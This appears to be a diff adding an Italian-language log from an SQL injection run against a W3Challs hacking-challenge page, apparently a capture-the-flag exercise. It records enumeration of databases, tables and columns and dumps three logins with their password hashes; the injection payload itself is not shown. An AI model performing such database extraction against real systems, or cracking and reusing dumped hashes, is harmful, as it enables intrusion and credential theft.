@@ -1,0 +1,28 @@
+Url da attaccare http://vip.hacking.w3challs.com/index.php?page=contact con metodo POST
+Database: 2
+information_schema
+VipWebArmy
+Attacco VipWebArmy
+Tabelle: 2
+membres
+messages
+Attacco membres
+Campi: 3
+id
+login
+password
+Estraggo i valori del campo id
+Valori: 3
+1
+2
+3
+Estraggo i valori del campo login
+Valori: 3
+Fr[4]Ger
+LuG[3]R
+K[1]LLeR
+Estraggo i valori del campo password
+Valori: 3
+b5c0b187fe309af0f4d35982fd961d7e
+4188679c1d8a284ccc41a6b601869e05
+031700427b70a87b0203a7d78a85c0da
